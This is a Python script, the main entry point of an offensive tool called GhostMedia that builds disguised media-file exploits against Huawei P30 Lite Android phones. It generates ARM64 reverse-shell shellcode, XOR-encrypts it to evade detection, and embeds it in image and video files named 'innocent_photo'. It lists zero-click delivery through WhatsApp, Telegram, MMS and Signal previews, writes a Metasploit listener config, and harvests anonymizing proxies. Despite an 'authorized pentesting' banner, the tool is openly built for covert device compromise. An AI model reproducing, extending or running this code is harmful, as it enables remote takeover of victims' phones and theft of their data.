#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  GhostMedia v2.0 - Media-Based Exploitation Framework           ║
║  Target: Huawei P30 Lite (Kirin 710 / ARM64 / Android 9-10)    ║
║  Authorized Pentesting Tool - For Ethical Use Only             ║
║  Features: AI Analyzer + Proxy Harvester (spys.one)            ║
╚══════════════════════════════════════════════════════════════════╝
"""

import argparse
import sys
import os
import time
import textwrap
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules import webp_exploit, png_exploit, mp4_exploit, jpeg_exploit
from modules.payload_builder import PayloadBuilder
from utils.helpers import (
    banner, print_status, print_success, print_error,
    print_warning, print_info, validate_ip, validate_port,
    check_dependencies, get_device_info
)

VERSION = "2.0.0"
BUILD_DATE = "2026-07-26"

SUPPORTED_DEVICES = {
    "huawei_p30_lite": {
        "chipset": "Kirin 710",
        "arch": "ARM64 (aarch64)",
        "android": "9.0 - 10.0 (EMUI 9.1 - 10.0)",
        "libwebp_version": "1.2.4 - 1.3.1 (vulnerable)",
        "media_framework": "Stagefright (Android 9/10 branch)",
        "skia_version": "Android 9/10 branch (vulnerable to multiple CVEs)",
    }
}


def parse_args():
    parser = argparse.ArgumentParser(
        description="GhostMedia - Advanced Media File Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Examples:
          python ghostmedia.py --format webp --lhost 192.168.1.10 --lport 4444
          python ghostmedia.py --format all --lhost 10.0.0.5 --lport 9001
          python ghostmedia.py --fetch-proxies --proxy-count 50 --min-anonymity HIA
          python ghostmedia.py --analyze-target
          python ghostmedia.py --diagnose "connection refused"
          python ghostmedia.py --full-diag --suggest-strategy
        """)
    )

    # Target Selection
    parser.add_argument("--target", "-t", type=str, default="huawei_p30_lite",
                        choices=list(SUPPORTED_DEVICES.keys()),
                        help="Target device profile (default: huawei_p30_lite)")

    # Format Selection
    parser.add_argument("--format", "-f", type=str,
                        choices=["webp", "png", "mp4", "jpeg", "all"],
                        help="Media format to weaponize")

    # Payload Configuration
    parser.add_argument("--payload", "-p", type=str,
                        default="android/shell/reverse_tcp",
                        help="Metasploit payload (or 'custom' for raw shellcode)")

    parser.add_argument("--lhost", "-L", type=str,
                        help="Listener host IP for reverse connection")

    parser.add_argument("--lport", "-P", type=int,
                        help="Listener port for reverse connection")

    parser.add_argument("--custom-shellcode", "-s", type=str,
                        help="Path to raw ARM64 shellcode file (hex or binary)")

    parser.add_argument("--encrypt", "-e", action="store_true",
                        help="XOR-encrypt payload to evade static detection")

    parser.add_argument("--iterations", "-i", type=int, default=1,
                        help="Number of encryption iterations (default: 1)")

    # Output Options
    parser.add_argument("--output", "-o", type=str,
                        help="Output directory for generated files")

    parser.add_argument("--name", "-n", type=str,
                        default="innocent_photo",
                        help="Base filename for output (default: innocent_photo)")

    # Listener Options
    parser.add_argument("--auto-listener", "-l", action="store_true",
                        help="Auto-start Metasploit listener after generation")

    parser.add_argument("--listener-type", type=str, default="metasploit",
                        choices=["metasploit", "netcat", "custom"],
                        help="Listener type (default: metasploit)")

    # Advanced Options
    parser.add_argument("--heap-spray", action="store_true",
                        help="Enable heap spray technique (WebP/PNG)")

    parser.add_argument("--spray-size", type=int, default=0x100000,
                        help="Heap spray allocation size in bytes (default: 1MB)")

    parser.add_argument("--rop-chain", type=str,
                        help="Path to custom ROP chain file (JSON)")

    parser.add_argument("--debug", "-d", action="store_true",
                        help="Enable verbose debug output")

    parser.add_argument("--version", "-v", action="version",
                        version=f"GhostMedia v{VERSION} (Build: {BUILD_DATE})")

    # ────────── Proxy & Anonymity (spys.one) ──────────
    proxy_group = parser.add_argument_group("Proxy & Anonymity (spys.one)")

    proxy_group.add_argument("--fetch-proxies", action="store_true",
                             help="Fetch fresh proxies from spys.one and validate them")

    proxy_group.add_argument("--proxy-count", type=int, default=30,
                             help="Number of proxies to validate (default: 30)")

    proxy_group.add_argument("--proxy-type", type=str,
                             choices=["http", "https", "socks4", "socks5", "all"],
                             default="all",
                             help="Filter by proxy type (default: all)")

    proxy_group.add_argument("--proxy-country", type=str, nargs="+",
                             help="Filter proxies by country code (e.g., US DE NL)")

    proxy_group.add_argument("--min-anonymity", type=str,
                             choices=["NOA", "ANM", "HIA"],
                             default="ANM",
                             help="Minimum anonymity level (default: ANM)")

    proxy_group.add_argument("--ssl-only", action="store_true",
                             help="Only use SSL/HTTPS proxies")

    proxy_group.add_argument("--export-proxies", type=str,
                             help="Export validated proxies: proxychains or json")

    # ────────── AI Diagnostic & Analysis ──────────
    ai_group = parser.add_argument_group("AI Diagnostic & Analysis")

    ai_group.add_argument("--analyze-target", action="store_true",
                          help="Run AI target analysis for selected device")

    ai_group.add_argument("--diagnose", type=str,
                          help="AI-diagnose an error message (provide error text)")

    ai_group.add_argument("--full-diag", action="store_true",
                          help="Run full system diagnostics")

    ai_group.add_argument("--suggest-strategy", action="store_true",
                          help="AI suggests best proxy/network strategy")

    ai_group.add_argument("--suggest-payload", action="store_true",
                          help="AI recommends best payload for target")

    ai_group.add_argument("--test-connection", type=str,
                          help="Test connectivity to HOST:PORT (e.g. 1.2.3.4:4444)")

    return parser.parse_args()


def handle_proxy_mode(args):
    """Handle all proxy fetching and validation operations."""
    from modules.proxy_harvester import ProxyHarvester

    print()
    print_status("Fetching proxies from spys.one...")

    harvester = ProxyHarvester(timeout=8, max_workers=30, debug=args.debug)

    if args.proxy_type in ("http", "https", "all"):
        harvester.fetch_http()
    if args.proxy_type in ("socks4", "socks5", "all"):
        harvester.fetch_socks()

    print_info(f"Fetched {len(harvester.proxies)} proxies total")

    print_status(f"Validating proxies ({args.proxy_count} target, "
                 f"{harvester.max_workers} threads)...")
    harvester.validate_all(min_alive=args.proxy_count)

    filtered = harvester.filter(
        countries=args.proxy_country,
        min_anonymity=args.min_anonymity,
        ssl_only=args.ssl_only,
        proxy_type=None if args.proxy_type == "all" else args.proxy_type,
    )

    print()
    stats = harvester.stats()
    print_success(f"Results: {stats['total_alive']}/{stats['total_fetched']} alive "
                  f"({stats['alive_percentage']}%)")
    print_info(f"Best proxy : {stats.get('best_proxy', 'N/A')}")
    print_info(f"Avg latency: {stats.get('avg_latency_ms', 'N/A')}ms")
    print_info(f"Countries  : {', '.join(stats.get('countries', [])[:15])}")

    print()
    print(f"{'─' * 70}")
    print(f"{'#':<3} {'IP:Port':<24} {'Country':<8} {'Anonymity':<6} "
          f"{'Type':<8} {'SSL':<4} {'Latency':<8} {'Score':<6}")
    print(f"{'─' * 70}")

    for i, p in enumerate(filtered[:20], 1):
        lat = f"{p.latency_ms:.0f}ms" if p.latency_ms else "N/A"
        ssl_mark = "Y" if p.ssl else "N"
        print(f"{i:<3} {p.ip}:{p.port:<18} {p.country:<8} {p.anonymity:<6} "
              f"{p.proxy_type:<8} {ssl_mark:<4} {lat:<8} {p.score:.0f}")

    print(f"{'─' * 70}")

    if args.export_proxies:
        fmt = args.export_proxies.lower()
        if fmt == "proxychains":
            path = harvester.export_proxychains()
            print_success(f"Proxychains config → {path}")
            print_info("Usage: proxychains4 -f " + path + " <command>")
        elif fmt == "json":
            path = harvester.export_json()
            print_success(f"JSON export → {path}")


def handle_ai_mode(args):
    """Handle all AI analysis and diagnostic operations."""
    from modules.ai_analyzer import AIAnalyzer

    ai = AIAnalyzer(debug=args.debug)
    BOLD = "\033[1m"
    W = "\033[0m"

    if args.analyze_target:
        print_status("AI analyzing target device...")
        analysis = ai.analyze_target(args.target)
        ai.print_target_analysis(analysis)

    if args.diagnose:
        print_status(f"AI diagnosing: \"{args.diagnose[:60]}...\"")
        print()
        diagnoses = ai.diagnose_error(args.diagnose)
        if diagnoses:
            for d in diagnoses:
                ai.print_diagnosis_report(d)
        else:
            print_warning("No specific pattern matched. Try --full-diag")

    if args.full_diag:
        print_status("Running full system diagnostics...")
        print()
        report = ai.run_full_diagnostics(
            lhost=args.lhost if hasattr(args, 'lhost') and args.lhost else None,
            lport=args.lport if hasattr(args, 'lport') and args.lport else None
        )

        sections = [
            ("SYSTEM", report.get("system", {})),
            ("DEPENDENCIES", report.get("dependencies", {})),
            ("NETWORK", report.get("network", {})),
        ]

        for title, data in sections:
            print(f"  {BOLD}{title}{W}")
            for k, v in data.items():
                print(f"    {k}: {v}")
            print()

        recs = report.get("recommendations", [])
        if recs:
            print(f"  {BOLD}RECOMMENDATIONS{W}")
            for r in recs:
                print(f"    • {r}")
            print()

    if args.suggest_strategy:
        print_status("AI generating proxy/network strategy...")
        print()
        strategy = ai.suggest_proxy_strategy(need_stealth=True, need_speed=False)
        for i, s in enumerate(strategy["strategies"], 1):
            rec = " ← RECOMMENDED" if s == strategy["recommended"] else ""
            print(f"  {BOLD}{i}. {s['name']}{W}{rec}")
            print(f"     Stealth: {s['stealth']}/10 | Speed: {s['speed']}/10 "
                  f"| Cost: {s['cost']}")
            print(f"     {s['setup'].strip()}")
            print()

    if args.suggest_payload:
        print_status("AI recommending payloads...")
        print()
        pa = ai.analyze_best_payload(target_arch="aarch64", target_android="10")
        for p in pa["payloads"]:
            rec = " ← RECOMMENDED" if p == pa["recommended"] else ""
            print(f"  {BOLD}{p['name']}{W}{rec}")
            print(f"    Type: {p['type']} | Size: {p['size']}")
            print(f"    Reliability: {p['reliability']}/10 | "
                  f"Stealth: {p['stealth']}/10")
            print(f"    Best for: {p['best_for']}")
            print()
        print_info(f"Note: {pa['note']}")

    if args.test_connection:
        try:
            host, port_str = args.test_connection.split(":")
            port = int(port_str)
        except ValueError:
            print_error("Format: HOST:PORT (e.g. 192.168.1.1:4444)")
            return

        print_status(f"Testing TCP connection to {host}:{port}...")
        result = ai.test_connectivity(host, port)
        if result["reachable"]:
            print_success(f"Reachable — Latency: {result['latency_ms']}ms")
        else:
            print_error(f"{result['error']}")
            if result.get("suggestion"):
                print_info(f"-> {result['suggestion']}")


def handle_exploit_mode(args):
    """Handle exploit generation mode."""
    if not validate_ip(args.lhost):
        print_error(f"Invalid LHOST: {args.lhost}")
        sys.exit(1)

    if not validate_port(args.lport):
        print_error(f"Invalid LPORT: {args.lport}")
        sys.exit(1)

    print_status("Checking dependencies...")
    deps_ok = check_dependencies()
    if not deps_ok:
        print_warning("Some dependencies missing. Run: bash install.sh")

    device = SUPPORTED_DEVICES[args.target]
    print_info(f"Target Device : {args.target}")
    print_info(f"Chipset       : {device['chipset']}")
    print_info(f"Architecture  : {device['arch']}")
    print_info(f"Android       : {device['android']}")
    print_info(f"libwebp       : {device['libwebp_version']}")
    print()

    builder = PayloadBuilder(
        lhost=args.lhost,
        lport=args.lport,
        payload=args.payload,
        custom_shellcode=args.custom_shellcode,
        encrypt=args.encrypt,
        iterations=args.iterations,
        debug=args.debug
    )

    print_status("Building ARM64 shellcode payload...")
    shellcode = builder.build()
    print_success(f"Payload generated: {len(shellcode)} bytes")

    output_dir = args.output or f"ghostmedia_output_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(output_dir, exist_ok=True)

    formats_to_generate = ["webp", "png", "mp4", "jpeg"] if args.format == "all" else [args.format]

    results = {}

    for fmt in formats_to_generate:
        print()
        print_status(f"Generating {fmt.upper()} exploit...")
        output_path = os.path.join(output_dir, f"{args.name}.{fmt}")

        try:
            if fmt == "webp":
                result = webp_exploit.generate(
                    shellcode=shellcode, output_path=output_path,
                    heap_spray=args.heap_spray, spray_size=args.spray_size,
                    debug=args.debug
                )
            elif fmt == "png":
                result = png_exploit.generate(
                    shellcode=shellcode, output_path=output_path,
                    heap_spray=args.heap_spray, debug=args.debug
                )
            elif fmt == "mp4":
                result = mp4_exploit.generate(
                    shellcode=shellcode, output_path=output_path, debug=args.debug
                )
            elif fmt == "jpeg":
                result = jpeg_exploit.generate(
                    shellcode=shellcode, output_path=output_path, debug=args.debug
                )

            results[fmt] = result
            file_size = os.path.getsize(output_path)
            print_success(f"[{fmt.upper()}] Generated: {output_path} ({file_size} bytes)")
            print_info(f"    CVE: {result.get('cve', 'N/A')}")
            print_info(f"    Technique: {result.get('technique', 'N/A')}")
            print_info(f"    Trigger: {result.get('trigger', 'N/A')}")

        except Exception as e:
            print_error(f"[{fmt.upper()}] Failed: {str(e)}")
            if args.debug:
                import traceback
                traceback.print_exc()

    print()
    print("=" * 60)
    print_success(f"Generation complete! Files saved to: {output_dir}/")
    print("=" * 60)
    print()
    print_info("Delivery Methods:")
    print("  • WhatsApp auto-download -> thumbnail triggers exploit")
    print("  • Telegram -> media preview triggers exploit")
    print("  • MMS -> automatic download & gallery thumbnail")
    print("  • Signal -> auto-download media")
    print("  • Any app with media preview enabled")
    print()

    if args.auto_listener:
        print_status("Starting Metasploit listener...")
        msf_rc = os.path.join(output_dir, "listener.rc")
        with open(msf_rc, "w") as f:
            f.write(f"""use exploit/multi/handler
set PAYLOAD {args.payload}
set LHOST {args.lhost}
set LPORT {args.lport}
set ExitOnSession false
exploit -j
""")
        print_info(f"Metasploit RC file: {msf_rc}")
        print_info(f"Run: msfconsole -r {msf_rc}")


def main():
    banner()
    args = parse_args()

    is_proxy_mode = args.fetch_proxies
    is_ai_mode = any([
        args.analyze_target, args.diagnose, args.full_diag,
        args.suggest_strategy, args.suggest_payload, args.test_connection
    ])
    is_exploit_mode = args.format is not None

    if is_proxy_mode:
        handle_proxy_mode(args)

    if is_ai_mode:
        handle_ai_mode(args)

    if is_exploit_mode:
        if not args.lhost:
            print_error("--lhost is required for exploit generation")
            sys.exit(1)
        if not args.lport:
            print_error("--lport is required for exploit generation")
            sys.exit(1)
        handle_exploit_mode(args)

    if not is_proxy_mode and not is_ai_mode and not is_exploit_mode:
        print_warning("No action specified.")
        print_info("Choose a mode:")
        print("  Exploit : --format <fmt> --lhost <IP> --lport <PORT>")
        print("  Proxies : --fetch-proxies [--proxy-count N]")
        print("  AI      : --analyze-target | --diagnose \"...\" | --full-diag")
        print()
        print_info("Run with --help for full usage information.")


if __name__ == "__main__":
    main()
